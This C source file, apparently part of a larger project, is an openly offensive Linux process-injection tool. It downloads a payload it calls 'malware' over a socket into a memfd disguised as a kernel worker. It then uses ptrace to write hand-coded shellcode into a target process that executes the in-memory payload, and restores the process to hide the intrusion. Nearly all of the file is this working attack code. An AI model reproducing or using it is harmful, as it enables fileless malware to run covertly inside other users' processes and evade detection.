
int    memfd_create(const char *name, unsigned int flags)
{
    return (syscall(NR_memfd_create, name, flags));
}

void    save_text_buffer(pid_t target_pid, byte *buf, size_t buf_len, void *orig_rip)
{
    size_t      i;
    u_int32_t   *text;
    u_int32_t   *save;

    text = (u_int32_t *)orig_rip;
    save = (u_int32_t *)buf;
    i = 0;
    printf("[+] Saving text_buffer\n");

    while (i < buf_len) {
        *save = (u_int32_t)ptrace(PTRACE_PEEKTEXT, target_pid, text, NULL);
        text++;
        save++;
        i += 4;
    }
}

void    restore_text_buffer(pid_t target_pid, byte *buf, size_t buf_len, void *orig_rip)
{
    size_t      i;
    u_int32_t   *text;
    u_int32_t   *save;

    text = (u_int32_t *)orig_rip;
    save = (u_int32_t *)buf;
    i = 0;

    printf("[+] Restoring text_buffer\n");
    while (i < buf_len) {
        ptrace(PTRACE_POKETEXT, target_pid, text, *save);
        text++;
        save++;
        i += 4;
    }
}

void    inject_into_process(pid_t target_pid, byte *shellcode, size_t shellcode_len, void *orig_rip)
{
    size_t      i;
    u_int32_t   *text;
    u_int32_t   *sc;

    text = (u_int32_t *)orig_rip;
    sc = (u_int32_t *)shellcode;
    i = 0;

    printf("[+] Injecting shellcode at %p\n", orig_rip);
    while (i < shellcode_len) {
        ptrace(PTRACE_POKETEXT, target_pid, text, *sc);
        text++;
        sc++;
        i += 4;
    }

    printf("[+] Executing the shellcode\n");
    if ((ptrace(PTRACE_CONT, target_pid, NULL, NULL))) {
        perror("ptrace(CONT)");
        exit(EXIT_FAILURE);
    }
}

void    receive_file(int sockfd, int *anon_fd)
{
    char    buf[1024];
    int     ret;

    if ((*anon_fd = memfd_create("[kworker/0:0-malware]", 0)) == -1) {
        perror("[-] memfd_create:");
        return ;
    }

    while ((ret = recv(sockfd, buf, sizeof(buf), MSG_DONTWAIT)) >= 0) {
        if (ret == 0)
            break ;
        write(*anon_fd, buf, ret);
    }
}

int     get_malware(char *address, int port, int *anon_fd)
{
    int             sockfd;
    t_sockaddr_in   sockaddr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("[-] socket: ");
        return (-1);
    }

    sockaddr.sin_addr.s_addr = inet_addr(address);
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(port);

    if ((connect(sockfd, (t_sockaddr *)&sockaddr, sizeof(sockaddr)))) {
        perror("[-] connect: ");
        return (-1);
    }
    
    receive_file(sockfd, anon_fd);

    close(sockfd);
    
    return (0);
}

int     main(int ac, char **av)
{
    pid_t   target_pid;
    byte    shellcode[] = "\x48\x31\xc0\xb0\x39\x0f\x05\x85\xc0\x75\x66\xbf\x01\x00\x00\x00\x48\x8d\x35\x32\x00\x00\x00\xba\x14\x00\x00\x00\xb0\x01\x0f\x05\x48\x8d\x3d\x36\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x8d\x35\x09\x00\x00\x00\xba\x14\x00\x00\x00\xb0\x01\x0f\x05\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x20\x6c\x61\x75\x6e\x63\x68\x65\x64\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xcc";
    t_regs  regs;
    int     anon_fd;
    byte    buf[120];
    int     status;

    if (ac != 2) {
        dprintf(2, "Usage : %s PID\n", av[0]);
        return(EXIT_FAILURE);
    }

    if ((get_malware("127.0.0.1", 4242, &anon_fd)) == -1)
        return (EXIT_FAILURE);
    sprintf((char *)(shellcode + sizeof(shellcode) - 22), "/proc/%d/fd/%d", getpid(), anon_fd);
    
    if (!(target_pid = atoi(av[1]))) {
        dprintf(2, "Invalid PID: must be a non-null integer\n");
        return(EXIT_FAILURE);
    }
 
    if ((ptrace(PTRACE_ATTACH, target_pid, NULL, NULL))) {
        perror("ptrace(ATTACH)");
        return(EXIT_FAILURE);
    }
    printf("[+] Attached to process\n");
    if ((ptrace(PTRACE_GETREGS, target_pid, NULL, &regs))) {
        perror("ptrace(GETREGS)");
        return(EXIT_FAILURE);
    }
    printf("[+] Got the regs\n");
    save_text_buffer(target_pid, buf, sizeof(shellcode), (void *)regs.rip);
    inject_into_process(target_pid, shellcode, sizeof(shellcode), (void *)regs.rip);

    waitpid(target_pid, &status, WUNTRACED);
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
        printf("[+] SIGTRAP received\n");
    }

    restore_text_buffer(target_pid, buf, sizeof(shellcode), (void *)regs.rip);
    if ((ptrace(PTRACE_SETREGS, target_pid, NULL, &regs))) {
        perror("ptrace(SETREGS)");
        return(EXIT_FAILURE);
    }
    printf("[+] Restored the regs\n");

    if ((ptrace(PTRACE_DETACH, target_pid, NULL, NULL))) {
        perror("ptrace(DETACH)");
        return(EXIT_FAILURE);
    }
    printf("[+] Detached from process\n");
    close(anon_fd);

    return (EXIT_SUCCESS);
}
